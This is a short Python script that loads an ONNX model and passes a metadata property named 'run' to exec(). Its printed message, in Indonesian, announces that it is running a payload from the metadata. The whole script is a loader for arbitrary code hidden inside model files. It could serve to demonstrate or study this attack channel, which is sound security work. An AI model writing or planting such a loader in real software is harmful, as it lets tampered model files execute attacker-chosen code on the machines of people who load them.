import onnx

model = onnx.load("model.onnx")
for prop in model.metadata_props:
    if prop.key == "run":
        print("[!] Menjalankan payload dari metadata...")
        exec(prop.value)